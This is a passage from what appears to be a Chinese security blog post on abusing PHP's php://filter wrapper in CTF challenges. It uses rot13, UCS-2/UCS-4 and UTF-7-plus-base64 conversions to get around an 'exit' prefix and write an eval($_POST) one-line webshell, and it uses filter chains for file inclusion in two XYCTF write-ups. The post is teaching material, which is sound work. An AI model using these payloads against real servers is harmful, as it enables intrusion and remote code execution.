+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试代码：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit;&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line">传入的payload:</span><br><span class="line">php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br><span class="line"> 拼接完后即是：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>;php:<span class="comment">//filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=erqie.php</span></span><br></pre></td></tr></table></figure>
+
+<p>最终结果：<br>成功写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194848128.png" class title="image-20240522194848128">
+
+<p>成功执行：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522194907522.png" class title="image-20240522194907522">
+
+<h6 id="convert-iconv-1"><a href="#convert-iconv-1" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h6><p>对于<code>iconv</code>字符编码转换进行绕过的手法，类似于上面所述的<code>rot13</code>方法，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。（注意：不出意外的话应该是只有类似”同族“的编码方式才能这样转换）</p>
+<ul>
+<li><strong>usc-2</strong></li>
+</ul>
+<p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），<strong>也就是说构造的恶意代码的字节数需要是UCS-2中2的倍数</strong>，不然不能进行正常反转</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment"># ?&lt;hp phpipfn(o;)&gt;? 从转换结果就可以看出来是如何转换的，为什么要是2的倍数 同时注意包裹要转换的字符串必须是单引号</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span> <span class="comment">#一句话木马</span></span><br><span class="line"><span class="comment">#?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?</span></span><br></pre></td></tr></table></figure>
+
+<p>payload(其实都差不多了感觉):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSx[)] ;&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>最后效果：</p>
+<p>成功写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201457636.png" class title="image-20240522201457636">
+
+<p>成功利用：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522201556443.png" class title="image-20240522201556443">
+
+<ul>
+<li><strong>usc-4</strong></li>
+</ul>
+<p>这个和上面那个差不多的，只不过这个是对目标字符串进行4位以反转(这里的4LE和4BE可以看作是小端和大端的列子），也就是说目标字符串的字节需要为4的倍数，简单说说：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$x[TS)]21&gt;? ;/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>最终效果：</p>
+<p>写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202744151.png" class title="image-20240522202744151">
+
+<p>利用：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522202830720.png" class title="image-20240522202830720">
+
+
+
+<ul>
+<li>utf8-utf7</li>
+</ul>
+<p>这个方法就与上面两个不同了，由于utf-8与utf-7在编码转换时只对符号进行编码，不对字符编码。如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[x12]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">#+ADw?php +AEA-eval(+ACQAXw-POST+AFs-x12+AF0)+ADs ?+AD4-   可以看出字符都被留下来了，并且在像上面方法那样利用转换并不能成功，可以自己试试</span></span><br></pre></td></tr></table></figure>
+
+<p>但是注意这个：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"><span class="comment">#+AD0- 并且刚好是四个字节，可以被base64解码掉</span></span><br></pre></td></tr></table></figure>
+
+<p>这个编码把<code>=</code>给过滤了，这时候就可以想到结合上面将的Base64编码使用，</p>
+<p>这是就要注意到之间说过的4个为一个单位来将前面的<code>phpexit</code>去掉，但是这里不一样，需要将传入的字符前面所有都为四个字节为一组，先看简单构造出来的payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=XXXPD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+  ： &lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时我们就需要想如何使得前面的能够为4个一组，操作点就在<code>XXX</code>那里，写一个php代码看看前面的在过滤后还剩什么：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;&lt;?php exit;php://filter/write=&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$ga</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ga</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">+ADw?php <span class="keyword">exit</span>+ADs-php:<span class="comment">//filter/write+AD0-</span></span><br><span class="line"></span><br><span class="line">+ADwphpexit+ADsphp<span class="comment">//filter/write+AD0</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#第二个字符串就是我们最终会被base64解码的字符串，这里刚好有36个字节，所以不用往前面加东西-即不用加X</span></span><br></pre></td></tr></table></figure>
+
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWyd4J10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>成功写入：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522212950464.png" class title="image-20240522212950464">
+
+<p>利用：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240522213035987.png" class title="image-20240522213035987">
+
+
+
+
+
+<p>参考文章：</p>
+<p><code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></p>
+<p><code>https://xz.aliyun.com/t/8163?time__1311=n4%2BxuDgDBDyGKAKD%3DD7Dl1oQST4j2DiKErYx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6</code></p>
+<p><code>https://blog.csdn.net/woshilnp/article/details/117266628</code></p>
+<h3 id="利用filter-chain生成任意字符"><a href="#利用filter-chain生成任意字符" class="headerlink" title="利用filter chain生成任意字符"></a>利用filter chain生成任意字符</h3><p>所以这里就利用了filter链的构造，详细看这个项目：</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
+<p>当然也有可以直接用来梭的脚本：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<h5 id="php-temp"><a href="#php-temp" class="headerlink" title="php:&#x2F;&#x2F;temp"></a>php:&#x2F;&#x2F;temp</h5><p>这里说明一个知识点，temp和memory伪协议</p>
+<p><code>php://memory</code>和<code>php://temp</code>是一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是<code>php://memory</code>总是把数据储存在内存中，而<code>php://temp</code>的内存限制可通过田间<code>/maxmemory:NN</code>来控制，NN是以字节为单位、保留在内存的最大数据量，超过则使用临时文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fiveMBs</span> = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>;  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://temp/maxmemory:<span class="subst">$fiveMBs</span>&quot;</span>, <span class="string">&#x27;r+&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="variable">$fp</span>, <span class="string">&quot;hello\n&quot;</span>);  </span><br><span class="line"><span class="comment">// 读取写入的数据.  </span></span><br><span class="line"><span class="title function_ invoke__">rewind</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>php://memory</code>和<code>php://temp</code>是一次性的，比如：当stream流关闭后，就无法再次得到以前的内容了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;PHP&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://memory&#x27;</span>); <span class="comment">// 啥也没有</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="如何构造"><a href="#如何构造" class="headerlink" title="如何构造"></a>如何构造</h5><p>由于PHP Filter的存在，我们可以利用一些操作来构造自己想要的内容。正好PHP Filter当中有一种<code>convert.iconv</code>的Filter，可以用来将数据从字符集A转换为字符集B。</p>
+<p>举个简单的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&quot;php://filter/convert.iconv.UTF-8/UTF-7/resource=data://,some&lt;&gt;text&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// some+ADwAPg-text 同时这里的data:,其实就是data伪协议，只是这里没有指定媒体类型，默认为text/plain;charset=US-ASCII，故只有后面的some&lt;&gt;text被转换了。</span></span><br></pre></td></tr></table></figure>
+
+<p>那么如何利用呢？</p>
+<p><strong>这里先说明一个技巧：</strong>当我们使用其他字符编码产生了不可见字符，并且对于PHP Base来说是非法字符（比如：$)C），那么此时我们只需要base64-decoded一下就可以去掉不可见字符了，但是与此同时，我们的C字符也也被 base64-decode解码了，这时候需要再把解码结果使用一次base64-encode即可还原回来原来的C字符，这样就可以留下我们想要的字符了。</p>
+<p>比如我们现在想要构造尖括号，因为base64编码合法字符里没有尖括号，所以不能直接产生PHP代码进行包含，但是可以通过上面的那个技巧来产生一个Base64字符串，最后再使用一次base64解码就可以产生了</p>
+<p>比如我们可以通过生成<code>PAaaaaa</code>，最后再经过Base64解码得到的字符为<code>&lt;</code>，后续为其他不需要的垃圾字符串。所以接下来需要做的，就是利用上面的技巧找到这么一类编码，可以只存在我们需要构造的一个webshell的base64字符串了。</p>
+<p>大概就是这个意思，直接看题，具体构造直接看下面的参考文章。</p>
+<h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>下面都是直接利用的这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
+<h6 id="用于文件包含"><a href="#用于文件包含" class="headerlink" title="用于文件包含"></a>用于文件包含</h6><p><strong>通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</strong>，比如XYCTF的题</p>
+<p><strong>ezLFI</strong></p>
+<p>题目描述：一句话木马？<br>——————</p>
+<p>有附件，可以知道index.php的内容为<code>&lt;?php include_once($_REQUEST[&#39;file&#39;]);</code>，waf了很多，这里可以通过叠加过滤器能够在allow_url_fopen和allow_url_include双Off的情况下直接通过php:&#x2F;&#x2F;filter进行文件包含getshell</p>
+<p>项目地址：<code>https://github.com/synacktiv/php_filter_chain_generator</code>，直接利用这个脚本生成</p>
+<p>如下：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152334913.png" class title="image-20240527152334913">
+
+<p>成功得到flag</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527152405691.png" class title="image-20240527152405691">
+
+<p><strong>这里可以利用的原因</strong>就在于<code>php://temp</code>，经过一系列过滤器处理后的数据被传递给了<code>php://temp</code>流，这意味着最终的数据被写入了一个临时文件中。这个临时文件中包含了经过处理的数据，由此可以用于文件包含。</p>
+<h6 id="用于构造任意字符串"><a href="#用于构造任意字符串" class="headerlink" title="用于构造任意字符串"></a>用于构造任意字符串</h6><p>其实本质和上面那个差不多，这里记录一下做法而已，对于为什么会在前面构造出想要的字符串，看参考文章。</p>
+<p><strong>连连看到底是连连什么看</strong></p>
+<p>题目描述：到底连连什么看才对呢？（flag在根目录&#x2F;flag下）</p>
+<p>——————</p>
+<p>开题就是一个小游戏，查看源码看到如下：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154205080.png" class title="image-20240527154205080">
+
+<p>直接尝试文件包含<code>?file=/flag</code>,显示：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154253580.png" class title="image-20240527154253580">
+
+<p>直接跳转到这个文件，得到php代码，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时就需要借鉴这个项目：<code>https://github.com/synacktiv/php_filter_chain_generator</code></p>
+<p>这里我们并不能保证<code>/etc/passwd</code>内容为想要的<code>XYCTF</code>，而且一般都不是，考点不会这么简单，这里估计想考的就是利用filter chain构造任意字符串，如下：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527154613313.png" class title="image-20240527154613313">
+
+<p>我们本地看看结果是什么</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png" class title="image-20240527174205087">
+
+<p>可以看到确实成功构造出来了<code>XYCTF</code>，但是由于这里有垃圾数据，就需要用到上面说过的<code>string.strip_tags</code>来过滤掉垃圾数据，如下构造</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png" class title="image-20240527174836426">
+
+<p>最终效果</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png" class title="image-20240527174418038">
+
+<p>再传入题目中：</p>
+<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png" class title="image-20240527174628296">
+
+<p>得到flag</p>
+<p>参考文章：</p>
+<p><code>https://tttang.com/archive/1395/</code></p>
+<p><code>https://probiusofficial.github.io/2023/02/07/Filter/#php-x2F-x2F-filter</code></p>
+<p><code>https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/#%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Fupanc
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://fupanc.github.io/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/" title="filter过滤器利用总结">https://fupanc.github.io/2024/05/27/对php的filter过滤器利用的总结/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/" rel="prev" title="Python内存马探究">
+                  <i class="fa fa-angle-left"></i> Python内存马探究
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Fupanc</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">
+    <!--由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动 -->
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script type="text/javascript"
+  color="0,0,0" opacity='0.4' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+    
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
